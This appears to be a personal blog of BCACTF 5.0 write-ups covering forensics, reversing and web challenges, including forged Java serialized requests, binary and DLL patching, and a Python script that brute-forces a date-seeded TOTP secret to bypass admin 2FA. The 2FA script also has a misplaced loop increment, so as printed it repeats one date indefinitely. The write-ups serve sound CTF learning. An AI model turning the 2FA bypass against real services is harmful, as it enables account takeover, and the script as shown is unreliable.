## BCACTF 5.0 - Foren, Rev, Web

Pretty fun challenges I did last weekend. Here's some writeups for some of them.

##### [forensics/flagserver](#forensicsflagserver-1)
##### [forensics/magic](#forensicsmagic-1)
##### [forensics/manipulate spreadsheet 2](#forensicsmanipulate-spreadsheet-2-1)
##### [forensics/wiretapped](#forensicswiretapped-1)
##### [rev/fps frenzy](#revfps-frenzy-1)
##### [rev/broken c code](#revbroken-c-code-1)
##### [web/moc, inc.](#webmoc-inc-1)

## forensics/flagserver

Description: It looks like Ircus have been using a fully exposed application to access their flags! Look at this traffic I captured. I can't seem to get it to work, though... can you help me get the flag for this very challenge?

We are given a flagserver.pcapng PCAP file. Inspect the network traffic in Wireshark. 
Server: 192.168.1.178, host: 10.0.2.15.

This challenge has to do with Java object serialization. Right away, we can see the magic number `0xaced`, which is the constant for `ObjectStreamConstants.STREAM_MAGIC` defined in JDK.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/5dfe759e-126b-40fe-a83b-846d1365995f)

I used a tool called [SerializationDumper](https://github.com/NickstaDB/SerializationDumper) to automate the analysis of serialization streams. First, we can follow the TCP stream in Wireshark.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/4798af01-36ad-48e8-865d-20c0528bbbfe)

Red = client, blue = server.

Copy as raw data and feed it as an argument to the SerializationDumper jar file.

Extraction of client stream:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/53943aae-aa3c-4491-8cfd-6bbca140e715)

The class being serialized is `flagserver.MessageCtoS_Request`, with a version identifier of `0xbd164155d760d5a3`. It also implements a the `Serializable` interface. 

Only 1 field is serialized within this class, `chall` which if of type `Ljava/lang/String;`, and it has the value `fakechall`.

Extraction of server stream:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/6b931d4b-3213-4905-ab58-c7e11f9c7074)

When the client sent the object, the server responded with a serialized object as well, containing a fake flag. The trick is that the server is hosting 2 flags, and we can craft the serialized object ourselves and send it to the server but changing the value of `chall` to `flagserver` to access the actual flag.

In Java, I made a class `MessageCtoS_Request` which implements the Serializable class, with attributes `serialVersionUID` and `chall`. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/8cc71ddf-7c7b-4d93-bae9-4dfeffc92054)

And also a main class which initializes the object and sends the serialized data to the server. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/602f92f7-a434-4877-a6a7-613abb1ca763)

I didn’t really parse the server’s output, I just dumped it.

`bcactf{thankS_5OCK3ts_and_tHreADInG_clA5s_2f6fb44c998fd8}`

## forensics/magic

Description: I found this piece of paper on the floor. I was going to throw it away, but it somehow screamed at me while I was holding it?!

We are given a PDF file, so I tried opening it Microsoft Edge:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/68effdef-d397-462b-96a7-9e34874085df)

Looks like a flag checker.

I opened it up in [PDF Stream Dumper](http://sandsprite.com/blogs/index.php?uid=7&pid=57) to analyze any streams. These streams are usually images, compressed data, fonts, etc. but they can contain embedded files like JavaScript as well, which seems to be the case here. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/87fc17a9-ed8a-4823-830a-006d46c4e753)

I found the Flag checker script, but it looks obfuscated. Instead of manually de-obfuscating it, we can plug it into [deobfuscate.io](https://obf-io.deobfuscate.io/), which happened to be the tool used for obfuscating the original code. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/3db88c37-c4f2-4c2b-baaf-17e4780b0c4a)

Looks like a simple XOR. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/822f3028-b8dd-4ace-a912-b98fdb7c47bf)

Our input is XORed with the value of `info.producer` mod (0x75 + counter). `info.producer` can be found in the PDF file metadata and it has the value `283548893274`. Since XOR is reversible and we have the final array `k`, we can just XOR each element of `k` with `info.producer` mod (0x75 + counter).

```python
def reconstruct_input(k, producer):
    user_input = ''
    producer_value = int(producer)
    for i in range(len(k)):
        key = producer_value % (0x75 + i)
        char_code = k[i] ^ key
        user_input += chr(char_code)
    return user_input

k = [0x46, 0x2d, 0x62, 0x11, 0x6b, 0x4c, 0x72, 0x5f, 0x76, 0x38, 0x19, 0x28, 0x5f, 0x31, 0x36, 0x63, 0xf7, 0xb1, 0x69, 0x2a, 0x18, 0x5e, 0x36, 0x1, 0x37, 0x3a, 0x1c, 0x5, 0x11, 0x56, 0xe5, 0x7b, 0x64, 0x2c, 0x11, 0x14, 0x53, 0x5a, 0x35, 0x17, 0x41, 0x62, 0x3]
producer = 283548893274

original_input = reconstruct_input(k, producer)
print(original_input)
```

`bcactf{InTerACtIv3_PdFs_W0W_cbd14436e6aea8}`

## forensics/manipulate spreadsheet 2

Description: Sequel to a challenge from BCACTF 4. The flag lies within: https://docs.google.com/spreadsheets/d/1kGrbQpZ4oUt0ChKvwGa4PDJQ1QvUl73Qpeo585vQ6s4/edit?usp=sharing

We are given a link to a Google Sheet which has 2 sheets, the 2nd one is hidden.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/1a650c9a-b5a2-4cf2-8c2c-5e484c948998)

By making a copy, we can access the hidden Sheet2. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/4a1fac74-dea9-4c54-ba3c-37b33a35fbc0)

This doesn’t make much sense at first, I tried to print to convert all bytes into ASCII and print them out on ascending index values, but it was just garbage data. So, I downloaded the original Sheet as .xlsx file, extracted it and looked into `xl/SharedStrings.xml`.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/bb5dba8f-6557-4852-91fb-4ce1a0ff3df0)

There seems to be 2 hex streams, when converted to ASCII, prints out:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/dd95d4e8-9192-4019-9f3c-8bec6d436aab)

Notice anything odd about the text? 

`BITS aligned, LEAST in SIGht`. Least Significant Bits?
So, I tried looping through each binary string starting from index 0, and grab the last bit, then concatenate these bits to form a new string. Then converted every 8 bits into an ASCII character.

```python
hex_data = "496e206469676974616c206669656c64732077686572652064617461206c6965732c0a5365637265742070616765732062656e6561746820636c65617220736b6965732e0a43656c6c7320656e7477696e652c206d7973746572696573206665656c2c0a4c6179657273206f66207365637265747320746865792072657665616c2e4c75726b696e6720736861646f77732c207365637265747320706c61792c0a537465616c746879207768697370657273206f6e20646973706c61792e0a4249545320616c69676e65642c204c4541535420696e2053494768742c0a476c65616d73206f6620736563726574732c207665696c656420696e206c696768742e"

decoded_text = bytes.fromhex(hex_data).decode('utf-8')
print(decoded_text)
print(len(decoded_text))

binary_values = [
    "00101110", "01010001", "00010001", "11100100", "10111000", "11001010", "10011001", "11111010",
    "00011000", "01110111", "11110001", "01000100", "10001010", "10001110", "11011001", "10011101",
    "10100010", "11000011", "11110111", "01111000", "10100110", "10110110", "01011100", "10111001",
    "00011100", "00000011", "01010001", "10011010", "00011100", "01110000", "00011011", "00111111",
    "10011100", "10000101", "00011111", "00111101", "01000000", "10000111", "10001100", "00000110",
    "00101110", "01100001", "00011101", "01000110", "01001010", "11001001", "11111111", "00100110",
    "01011010", "10101101", "01100111", "11011011", "10001001", "00110010", "00110011", "00000101",
    "10000010", "01011010", "11010101", "10111101", "00110110", "01100011", "01001111", "11010100",
    "00000100", "10101010", "01010011", "00010101", "01001110", "01111100", "01011010", "10010110",
    "10001110", "00110010", "00110111", "00101101", "10110110", "11100110", "11100110", "01001100",
    "11011010", "11010011", "00110110", "01101100", "10011010", "10001011", "01010000", "10101010",
    "10011010", "10111011", "00010110", "11100111", "00011001", "11101101", "00010011", "01000001",
    "11111010", "10111001", "11001011", "11000010", "00110101", "01010100", "11001101", "01110110",
    "10110110", "11111001", "01011011", "10011110", "00111011", "01010101", "10110011", "01101001",
    "00011010", "00001001", "11100011", "01010100", "11011110", "10101010", "00000001", "00000100",
    "00110010", "10110111", "01111110", "01011001", "00110101", "10001011", "00011001", "10000111",
    "11110010", "01101001", "00101110", "00010101", "10110000", "00100101", "10011010", "11111011",
    "01001110", "11000011", "11001101", "01000101", "10110110", "00000000", "00100001", "00010001",
    "11111110", "00111111", "01110011", "00101010", "11000101", "00101010", "10110000", "00101111",
    "01111000", "11000101", "10101001", "11001110", "01111011", "01000011", "00110101", "00111110",
    "10011010", "01010111", "00110001", "00001000", "01101100", "01110011", "11101111", "00101101",
    "00110010", "01011101", "00000000", "11111111", "11110101", "11011101", "00000001", "11101011",
    "00001110", "11111010", "01011111", "01110011", "10000111", "01010110", "00000010", "10001101",
    "10011110", "00100110", "11100011", "00011011", "00011000", "10001010", "00001000", "01100010",
    "01000100", "00010100", "10101001", "11001011", "11111100", "11110010", "00001100", "01100110",
    "00010010", "10111101", "00100010", "01100010", "01111110", "00011111", "11101101", "11000101",
    "10001000", "01000000", "00010001", "00011101", "00010110", "10011010", "11100000", "10001111",
    "00111110", "00111010", "00100111", "11110001", "00100010", "10100100", "01110001", "00001001",
    "10010000", "01001011", "01000000", "10101001", "10000101", "01101001", "10000011", "11001111",
    "11110110", "10001001", "11101000", "11111111", "00011000", "01010000", "01011011", "11001001",
    "11010000", "10010111", "01011100", "01101110", "00100101", "10011100", "01011010", "00011010",
    "01000000", "10111111", "00011001", "11001000", "11100000", "10001011", "01011010", "01111111",
    "10100010", "10100000", "00010001", "01101001", "00111000", "11101110", "00101101", "00101111",
    "11111000", "11000001", "01010001", "11101101", "01001110", "00111011", "00000000", "11001110",
    "01000110", "01001110", "10111001", "10011011", "00111100", "10011101", "01000010", "01110101",
    "10110110", "01011011", "11010101", "10011001", "00000001", "11110111", "10000000", "00001111"
]

# Extract the least significant bit from each binary value
lsb_bits = [b[-1] for b in binary_values]  # Get the last character of each string

# Convert every 8 bits to ASCII
ascii_output = ''
for i in range(0, len(lsb_bits), 8):
    byte = ''.join(lsb_bits[i:i+8])
    if len(byte) == 8:
        ascii_char = chr(int(byte, 2))
        ascii_output += ascii_char

print(ascii_output)
```

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/8ed68f9e-8f25-43dd-ace2-fbbd6f2ea4e9)

`bcactf{600D_job_Using_900G13_SHe3t5}`

## forensics/wiretapped

Description: I've been listening to this cable between two computers, but I feel like it's in the wrong format.

We’re given a wav file `wiretapped.wav`, opening in HXD, right away we can see an embedded Wireshark PCAPNG file with the magic number in the header: `0x4D3C2B1A`. 

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/3e1b0758-8736-42eb-a7ef-f86f2f1ed961)

We can just carve this out manually and open the extracted file in Wireshark.

Following the first TCP stream, we get the first half of the flag. It also hinted that the rest of the flag was communicated through port 5500.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/e27222f1-d9be-4f5f-8d76-472bd3bca28c)

The client made a HTTP request to the server for the resource `/rest_of_flag.jpg`.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/48d98c7b-ea7d-477a-a38b-7ff259907a1d)

We can pretty much just follow that TCP stream and dump the response from the server.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/91092e3b-af2b-4471-a13a-fdcbc125891a)

Opening the image gives us the second half of the flag!

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/7e356f0e-9750-48f1-ba7c-afc56986014d)

`bcactf{listening_in_a28270fb0dbfd}`

## rev/fps frenzy

Pretty cool game.

Description: My friend Timmy made a game at the MoCO (Master of Code Olympiad) in just 50 nanoseconds! He told me that he hid a secret text somewhere in the game and placed a bet that I would not solve it. I'm not good at games, so can you please find this text?

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/b39bf4dd-31ea-4b3e-a62c-d7eebd4514c2)

After defeating the second enemy, the game brings you back to the main menu. 

The author of the challenge also gave a hint about an inaccessible area of the map, which I believe is this tower in game.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/9521c17d-8416-48be-a59b-c798157881ca)

Since this is a Unity game, that means we can try to use dnSpy to inspect the game scripts.
In `fps.Gameplay.dll`, there are some mentions about a jetpack in game:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/11a6c2ba-dd03-49e5-a761-154e057a2c14)

We can enable the jetpack at the start of the game, but to make this quick and easy, we can just modify our jump height under `Unity.FPS.Gameplay.PlayerCharacterController.JumpForce`.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/5935524e-3ce6-475d-9e69-33f3b01d22fd)

Compile and save the modified DLL, and profit!

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/7f7a4714-4584-4527-ba9b-bccda3430d04)

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/30faa3cc-f2d6-40c9-a29e-e8af405c9837)

`bcactf{7H3_14w_of_c0S1nEs_4b723470334e}`

## rev/broken c code

Description: Help! I was trying to make a flag printer but my C code just prints random garbage and I can't figure out why! Can you help me?

We are given an ELF binary, opening it up in IDA:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/6d36ca85-af5d-4054-b13c-3ddc152adfd5)

The main routine seems very simple, `unk_400800` stores some garbled data, data is copied to `v6`, there is a loop which calculates the square root of `v6[v3] – 3` and prints the ASCII character. `v3`also gets the next value of `i` each loop. 

Contents of `unk_400800`:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/2a17585c-f61e-4e7f-84bf-323c8e224120)

Performing square root on the first integer 0x2587 – 3 gives us 0x62, which is `b` in ASCII, first character of the flag format. Sqrt(0x9801 - 3) gives us 0x63, ‘c’, which is the second character of the flag format. Looks like `v3 = i++` is unnecessary since it is skipping characters. We can just patch the binary. 

In Binary Ninja, we can patch `lea edx, [rax+0x1]` at address `0x400681` to `lea edx, [rax]`.

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/216a2fb0-dc38-4011-9571-efabf5cb3a3d)

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/c9178742-6e22-449d-ab7d-ad3c3b7d85c9)

`bcactf{c_c0dE_fIXeD_7H4NK5_762478276}`

## web/moc, inc.

Description: Towards the end of last month, we started receiving reports about suspicious activity coming from a company called MOC, Inc. Our investigative team has tracked down their secret company portal and cracked the credentials to the admin account, but could not bypass the advanced 2FA system. Can you find your way in?
username: admin
password: admin

We’re given app.py. Goal is to login as admin using the correct 2FA code.

Snippet of how the 2FA code is generated for each user:

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/f0c4343d-bbdf-4f1e-a6cb-f8da1efdc500)

Apparently, the 2FA code `totp_secret` is set at the time when the user information is inserted into the database and stays static. 

The PRNG is also seeded via `random.seed(datetime.datetime.today().strftime('%Y-%m-%d'))`, using the exact date of the time of the inserting the entry into the database. 

The chal author provided a hint, that the admin user was created some time during May 2024. So, there are only 31 possible values we have to brute force, through seeding the PRNG with each of the dates and getting the first result from the PRNG, sending it to the server and inspecting the response. Here, I am assuming that the admin is the first user inserted into the database for any particular dates.

```python
import datetime
import random
import pyotp
import requests

url = 'http://challs.bcactf.com:31772/'

username = 'admin'
password = 'admin'

SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

# Start from May 1, 2024
start_date = datetime.date(2024, 5, 1)

def generate_totp_secret(date):
    random.seed(date.strftime('%Y-%m-%d'))
    return ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

def try_login(date):
    totp_secret = generate_totp_secret(date)
    totp = pyotp.TOTP(totp_secret)
    otp = totp.now()

    payload = {
        'username': username,
        'password': password,
        'totp': otp
    }

    response = requests.post(url, data=payload)
    return response

# Iterate through the dates starting from May 1, 2024
current_date = start_date
while True:
    response = try_login(current_date)
    print(f'Trying date {current_date}: {response.status_code} - {response.text}')
    
    if 'Invalid username/password.' not in response.text and '2FA code is incorrect.' not in response.text:
        print(f'Success, Date: {current_date}')
        print(response.text)
        break
    
current_date += datetime.timedelta(days=1)
```

![image](https://github.com/jiayuchann/jiayuchann.github.io/assets/58498244/a8b65948-b488-4938-b24f-1d205dc5539e)

`bcactf{rNg_noT_r4Nd0m_3n0uGH_a248dc91}`
